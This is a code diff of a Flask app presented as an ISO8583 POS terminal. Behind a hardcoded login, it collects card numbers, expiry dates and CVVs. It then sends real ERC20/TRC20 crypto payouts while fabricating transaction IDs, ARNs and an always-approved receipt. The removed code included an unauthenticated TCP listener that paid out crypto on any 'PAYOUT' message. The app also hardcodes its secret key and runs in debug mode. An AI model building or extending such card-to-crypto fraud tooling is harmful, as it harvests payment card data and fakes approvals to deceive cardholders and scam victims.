@@ -1,37 +1,33 @@
 from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash
-import random, logging, qrcode, io, os, json, hashlib, re, socket, threading
+import random, logging, qrcode, io, os, json, hashlib, re
 from datetime import datetime
 from functools import wraps
-from web3 import Web3
-from tronpy import Tron
-from tronpy.keys import PrivateKey
+from iso8583_crypto import send_iso8583_transaction, send_erc20_payout, send_trc20_payout, load_config
 
 app = Flask(__name__)
 app.secret_key = 'rutland_secret_key_8583'
 logging.basicConfig(level=logging.INFO)
 
-# --- Configuration ---
+# Configuration
 USERNAME = "blackrock"
-DEFAULT_PASSWORD = "Br_3339"
 PASSWORD_FILE = "password.json"
-CONFIG_FILE = "config.json"
+CONFIG = load_config()
 
 # Ensure password file exists
 if not os.path.exists(PASSWORD_FILE):
     with open(PASSWORD_FILE, "w") as f:
-        hashed = hashlib.sha256(DEFAULT_PASSWORD.encode()).hexdigest()
-        json.dump({"username": USERNAME, "password": hashed}, f)
+        hashed = hashlib.sha256("Br_3339".encode()).hexdigest()
+        json.dump({"password": hashed}, f)
 
 def check_password(raw):
     with open(PASSWORD_FILE) as f:
-        u = json.load(f)
-        stored = u['password']
-    return hashlib.sha256(raw.encode()).hexdigest() == stored or raw == DEFAULT_PASSWORD
+        stored = json.load(f)['password']
+    return hashlib.sha256(raw.encode()).hexdigest() == stored
 
 def set_password(newpass):
     with open(PASSWORD_FILE, "w") as f:
         hashed = hashlib.sha256(newpass.encode()).hexdigest()
-        json.dump({"username": USERNAME, "password": hashed}, f)
+        json.dump({"password": hashed}, f)
 
 def login_required(f):
     @wraps(f)
@@ -42,7 +38,7 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated
 
-# Dummy card database (unchanged)
+# Dummy card database
 DUMMY_CARDS = {
     "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
     "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
@@ -62,19 +58,14 @@ DUMMY_CARDS = {
 }
 
 PROTOCOLS = {
-    "101.1": 4,
-    "101.2": 6,
-    "101.3": 6,
-    "101.4": 6,  # You can handle both 4 and 6 as needed
-    "101.5": 0,  # Auth only – no approval code required?
-    "101.6": 6,
-    "101.7": 4,
-    "101.8": 4,
-    "201.1": 6,
-    "201.2": 6,
-    "201.3": 6,
-    "201.4": 6,
-    "201.5": 6  # Or customize depending on your logic
+    "POS Terminal -101.1 (4-digit approval)": 4,
+    "POS Terminal -101.4 (6-digit approval)": 6,
+    "POS Terminal -101.6 (Pre-authorization)": 6,
+    "POS Terminal -101.7 (4-digit approval)": 4,
+    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
+    "POS Terminal -201.1 (6-digit approval)": 6,
+    "POS Terminal -201.3 (6-digit approval)": 6,
+    "POS Terminal -201.5 (6-digit approval)": 6
 }
 
 FIELD_39_RESPONSES = {
@@ -86,124 +77,6 @@ FIELD_39_RESPONSES = {
     "92": "Invalid Terminal Protocol"
 }
 
-# Load or create config.json with default wallets for payouts
-def load_config():
-    if not os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, "w") as f:
-            json.dump({
-                "erc20_wallet": "0x1234567890abcdef1234567890abcdef12345678",
-                "trc20_wallet": "TXYZ1234567890abcdefghijklmnopqrs"
-            }, f)
-    with open(CONFIG_FILE) as f:
-        return json.load(f)
-
-CONFIG = load_config()
-
-# --- ISO8583 TCP Server Thread (non-blocking) ---
-def iso8583_server_thread(host='127.0.0.1', port=8583):
-    def server():
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.bind((host, port))
-            s.listen()
-            logging.info(f"ISO8583 Test Server running on {host}:{port}")
-            while True:
-                conn, addr = s.accept()
-                with conn:
-                    logging.info(f"ISO8583 Client connected: {addr}")
-                    while True:
-                        data = conn.recv(2048)
-                        if not data:
-                            break
-                        logging.info(f"Received ISO8583 data: {data}")
-
-                        # Reply with mock response to avoid client timeout
-                        conn.sendall(b"ISO8583 ACK:123456")
-
-                        # (Optional) Trigger crypto payout based on ISO8583 content:
-                        try:
-                            decoded = data.decode(errors='ignore')
-                            if "PAYOUT" in decoded:
-                                # Example: parse payout_type, address, amount, contract
-                                import re
-                                payout_type = "ERC20" if "erc" in decoded.lower() else "TRC20"
-                                to_addr_match = re.search(r"ADDR:(\S+)", decoded)
-                                amt_match = re.search(r"AMT:(\S+)", decoded)
-                                contract_match = re.search(r"CONTRACT:(\S+)", decoded)
-
-                                if to_addr_match and amt_match and contract_match:
-                                    to_address = to_addr_match.group(1)
-                                    amount = amt_match.group(1)
-                                    contract = contract_match.group(1)
-                                    if payout_type == "ERC20":
-                                        txid = send_erc20_payout(
-                                            os.getenv("ERC20_PRIVATE_KEY"),
-                                            to_address,
-                                            amount,
-                                            contract,
-                                            os.getenv("INFURA_URL")
-                                        )
-                                        logging.info(f"ERC20 payout TXID: {txid}")
-                                    else:
-                                        txid = send_trc20_payout(
-                                            os.getenv("TRC20_PRIVATE_KEY"),
-                                            to_address,
-                                            amount,
-                                            contract,
-                                            network=os.getenv("TRON_NETWORK", "mainnet")
-                                        )
-                                        logging.info(f"TRC20 payout TXID: {txid}")
-                        except Exception as e:
-                            logging.error(f"Error processing payout from ISO8583 message: {e}")
-
-    threading.Thread(target=server, daemon=True).start()
-
-# Start ISO8583 Server Thread
-iso8583_server_thread()
-
-# --- ERC20 Payout Function ---
-def erc20_abi():
-    return [
-        {"constant":False,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
-        {"constant":True,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
-    ]
-
-def send_erc20_payout(private_key, to_address, amount, contract_address, infura_url):
-    web3 = Web3(Web3.HTTPProvider(infura_url))
-    acct = web3.eth.account.privateKeyToAccount(private_key)
-    contract = web3.eth.contract(address=Web3.toChecksumAddress(contract_address), abi=erc20_abi())
-    decimals = contract.functions.decimals().call()
-    amt_wei = int(float(amount) * (10 ** decimals))
-    nonce = web3.eth.getTransactionCount(acct.address)
-    chain_id = 1 if "mainnet" in infura_url else 5
-    tx = contract.functions.transfer(Web3.toChecksumAddress(to_address), amt_wei).buildTransaction({
-        'chainId': chain_id,
-        'gas': 60000,
-        'gasPrice': web3.eth.gas_price,
-        'nonce': nonce,
-    })
-    signed = acct.sign_transaction(tx)
-    tx_hash = web3.eth.sendRawTransaction(signed.rawTransaction)
-    return web3.toHex(tx_hash)
-
-# --- TRC20 Payout Function ---
-def send_trc20_payout(tron_private_key, to_address, amount, contract_address, network='mainnet'):
-    client = Tron(network=network)
-    priv_key = PrivateKey(bytes.fromhex(tron_private_key))
-    contract = client.get_contract(contract_address)
-    decimals = contract.functions.decimals()
-    amt = int(float(amount) * (10 ** decimals))
-    txn = (
-        contract.functions.transfer(to_address, amt)
-        .with_owner(priv_key.public_key.to_base58check_address())
-        .fee_limit(1_000_000)
-        .build()
-        .sign(priv_key)
-    )
-    result = txn.broadcast()
-    return result['txid']
-
-# --- Flask Routes ---
-
 @app.route('/')
 def home():
     return redirect(url_for('login'))
@@ -211,20 +84,12 @@ def home():
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        user = request.form.get('username', '').strip()
-        passwd = request.form.get('password', '').strip()
-
-        # Debug log (optional)
-        print("Entered user:", user)
-        print("Entered pass:", passwd)
-        print("Entered hash:", hashlib.sha256(passwd.encode()).hexdigest())
-
-        if user == 'blackrock' and check_password(passwd):
+        user = request.form.get('username')
+        passwd = request.form.get('password')
+        if user == USERNAME and check_password(passwd):
             session['logged_in'] = True
             return redirect(url_for('protocol'))
-        else:
-            flash("Invalid username or password.")
-            return render_template('login.html')
+        flash("Invalid username or password.")
     return render_template('login.html')
 
 @app.route('/logout')
@@ -249,15 +114,13 @@ def change_password():
 @login_required
 def protocol():
     if request.method == 'POST':
-        selected = request.form.get('protocol', '').strip()
-        if selected in PROTOCOLS:
-            session['protocol'] = selected
-            session['code_length'] = PROTOCOLS[selected]
-            print(f"DEBUG: Selected protocol = {selected}, Code length = {session['code_length']}")
-            return redirect(url_for('amount'))
-        else:
+        selected = request.form.get('protocol')
+        if selected not in PROTOCOLS:
             return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
-    return render_template('protocols.html', protocols=PROTOCOLS.keys())
+        session['protocol'] = selected
+        session['code_length'] = PROTOCOLS[selected]
+        return redirect(url_for('amount'))
+    return render_template('protocol.html', protocols=PROTOCOLS.keys())
 
 @app.route('/amount', methods=['GET', 'POST'])
 @login_required
@@ -292,51 +155,116 @@ def payout():
 @login_required
 def card():
     if request.method == 'POST':
-        pan = request.form.get('pan')
-        expiry = request.form.get('expiry')
-        cvv = request.form.get('cvv')
-        session['pan'] = pan
-        session['expiry'] = expiry
-        session['cvv'] = cvv
+        pan = request.form['pan'].replace(" ", "")
+        exp = request.form['expiry'].replace("/", "")
+        cvv = request.form['cvv']
+        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})
+
+        if pan.startswith("4"):
+            session['card_type'] = "VISA"
+        elif pan.startswith("5"):
+            session['card_type'] = "MASTERCARD"
+        elif pan.startswith("3"):
+            session['card_type'] = "AMEX"
+        elif pan.startswith("6"):
+            session['card_type'] = "DISCOVER"
+        else:
+            session['card_type'] = "UNKNOWN"
+
         return redirect(url_for('auth'))
+
     return render_template('card.html')
 
 @app.route('/auth', methods=['GET', 'POST'])
 @login_required
 def auth():
-    expected_length = int(session.get('code_length', 4))
-
+    expected_length = session.get('code_length', 6)
     if request.method == 'POST':
-        code = request.form.get('auth_code', '').strip()
-        print(f"DEBUG: Raw code: '{code}' | Length: {len(code)} | Expected: {expected_length}")
+        code = request.form.get('auth')
+        if len(code) != expected_length:
+            return render_template('auth.html', warning=f"Code must be {expected_length} digits.")
 
-        if not code or len(code) != expected_length:
-            flash(f"Authorization code must be exactly {expected_length} digits.")
-            return redirect(url_for('auth'))
+        txn_id = f"TXN{random.randint(100000, 999999)}"
+        arn = f"ARN{random.randint(100000000000, 999999999999)}"
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        field39 = "00"
 
-        session['auth_code'] = code
-        session['txn_id'] = f"TXN{random.randint(100000, 999999)}"
-        session['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        session.update({
+            "txn_id": txn_id,
+            "arn": arn,
+            "timestamp": timestamp,
+            "field39": field39
+        })
+
+        # === Trigger payout ===
+        try:
+            if session['payout_type'] == 'ERC20':
+                send_erc20_payout(session['wallet'], float(session['amount']))
+            elif session['payout_type'] == 'TRC20':
+                send_trc20_payout(session['wallet'], float(session['amount']))
+        except Exception as e:
+            flash(f"Payout Error: {str(e)}")
+            return redirect(url_for('rejected', code="91", reason=str(e)))
+
         return redirect(url_for('success'))
 
-    return render_template('auth.html', code_length=expected_length)
-    
+    return render_template('auth.html')
+
 @app.route('/success')
 @login_required
 def success():
     return render_template('success.html',
-        txn_id=session.get('txn_id'),
-        pan=session.get('pan', '')[-4:],
-        amount=session.get('amount'),
-        timestamp=session.get('timestamp'),
-        wallet=session.get('wallet'),
-        payout_type=session.get('payout_type'))
+        txn_id=session.get("txn_id"),
+        arn=session.get("arn"),
+        pan=session.get("pan", "")[-4:],
+        amount=session.get("amount"),
+        timestamp=session.get("timestamp")
+    )
 
-@app.route('/rejected/<code>/<reason>')
-def rejected(code, reason):
-    return render_template('rejected.html', code=code, reason=reason)
+@app.route("/receipt")
+def receipt():
+    raw_protocol = session.get("protocol", "")
+    match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
+    if match:
+        protocol_version = match.group(1)
+        auth_digits = int(match.group(2))
+    else:
+        protocol_version = "Unknown"
+        auth_digits = 4
 
-# --- Main ---
+    raw_amount = session.get("amount", "0")
+    if raw_amount and raw_amount.isdigit():
+        amount_fmt = f"{int(raw_amount):,}.00"
+    else:
+        amount_fmt = "0.00"
+
+    return render_template("receipt.html",
+        txn_id=session.get("txn_id"),
+        arn=session.get("arn"),
+        pan=session.get("pan")[-4:],
+        amount=amount_fmt,
+        payout=session.get("payout_type"),
+        wallet=session.get("wallet"),
+        auth_code="*" * auth_digits,
+        iso_field_18="5999",
+        iso_field_25="00",
+        field39="00",
+        card_type=session.get("card_type", "VISA"),
+        protocol_version=protocol_version,
+        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    )
+
+@app.route('/rejected')
+def rejected():
+    return render_template('rejected.html',
+        code=request.args.get("code"),
+        reason=request.args.get("reason", "Transaction Declined")
+    )
+
+@app.route('/offline')
+@login_required
+def offline():
+    return render_template('offline.html')
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    app.run(host='0.0.0.0', port=10000, debug=True)
